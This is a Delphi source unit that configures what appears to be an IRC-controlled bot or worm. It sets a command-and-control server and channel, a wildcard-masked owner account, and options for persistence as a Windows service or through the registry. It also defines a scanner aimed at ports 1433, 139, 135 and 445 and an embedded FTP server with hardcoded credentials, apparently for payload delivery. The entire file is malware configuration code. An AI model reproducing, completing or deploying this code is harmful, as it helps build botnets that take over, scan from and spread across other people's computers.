unit config;

{$include def.mor}

interface

Uses Classes,masks,stuff,Winsock,SysUtils{$ifdef debug},logger{$endif};

Type
  Tuser = packed record
    Name:string[10];
    Mask:string[50];
    Logged:Boolean;
  end;
  TData = packed record
    BOT_CHANNAL:STRING[10];
    BOT_NICK_PREFIX:String[5];
    BOT_COMMAND_PREFIX:Char;
    BOT_As_Service,BOT_As_Reg,BOT_LOOKUPADRESSS:Boolean;
    BOT_Service_Name:AnsiString;
    BOT_Service_Info:AnsiString;
    BOT_RemoteIP,BOT_LocalIP:string[15];
    FTP_User,FTP_Pass:String[8];
    SCAN_TimeOut:smallint;
    BOT_NICK:String[50];
    Servers:Array of string;
    Users:array of Tuser;
    dScannerPorts:array of smallint;
  end;

Var Data:TData;
    WSAData:TWSAData;

Function Find_User(Const User,maskk:string):Smallint;
Procedure Login_User(A:Smallint);
Procedure Logout_User(A:Smallint);
Function IsLogIn_User(A:Smallint):Boolean;
Procedure InitConfig;

implementation

Uses ftp;

Procedure Add_User(const user,maskk:string);
begin
  SetLength(Data.Users,Length(Data.Users)+1);
  Data.Users[length(Data.Users)-1].Name:=user;
  Data.Users[length(Data.Users)-1].Mask:=maskk;
  Data.Users[length(Data.Users)-1].Logged:=false;
end;

Procedure Login_User(A:Smallint);
begin
  Data.Users[a].Logged:=true;
end;

Procedure Logout_User(A:Smallint);
begin
  Data.Users[a].Logged:=false;
end;

Function IsLogIn_User(A:Smallint):Boolean;
begin
  Result:=Data.Users[a].Logged;
end;

Function Find_User(Const User,maskk:string):Smallint;
var i:smallint;
begin
  Result:=-1;
  for i:=0 to length(data.Users)-1 do
  if (user = data.Users[i].Name) and MatchesMask(Maskk,Data.users[i].mask) then result:=i;
end;

Procedure Add_Server(Const Address:string;Port:word);
begin
  Setlength(Data.Servers,length(Data.servers)+1);
  Data.Servers[length(Data.servers)-1]:=Address + #58 + Inttostr(Port);
end;

Procedure InitConfig;
begin
  // Users
  add_User('god','*');

  // Servers
  add_server('irc.efnet.nl',6667);

  // Main
  Data.BOT_NICK_PREFIX:='Mama';
  DATA.BOT_CHANNAL:='#joinhere';
  Data.BOT_COMMAND_PREFIX:='!';
  Data.BOT_As_Service:=false;
  Data.BOT_As_Reg:=true;
  data.BOT_Service_Name:='IDF';
  Data.BOT_Service_Info:='Test Service';
  Data.SCAN_TimeOut:=1; // 1000ms
  DATA.BOT_LOOKUPADRESSS:=TRUE;
  DATA.FTP_User:='Test';
  DATA.FTP_Pass:='Test';

  Setlength(Data.dScannerPorts,4);
  Data.dScannerPorts[0]:=1433;
  Data.dScannerPorts[1]:=139;
  Data.dScannerPorts[2]:=135;
  Data.dScannerPorts[3]:=445;

  {$ifdef debug}
    AddToMessageLog('[DEBUG] CONFIG INIT <OK>');
  {$endif}

  // Load WinSock 1.1
  if WSAStartup($101, WSAData) = 0 then
  begin
    {$ifdef debug}
      AddToMessageLog('[DEBUG] WINSOCK 1.1 INIT <OK>');
    {$endif}
    Data.BOT_RemoteIP:='NONE'; // DO NOT CHANGE
    Data.BOT_LocalIP:=GetLocalIP;
    // INIT FTP
    FTP.run;
  end
  else
  begin
    {$ifdef debug}
      AddToMessageLog('[DEBUG] WINSOCK 1.1 INIT <NOT OK>');
    {$endif}
    halt;
  end

end;

begin

end.


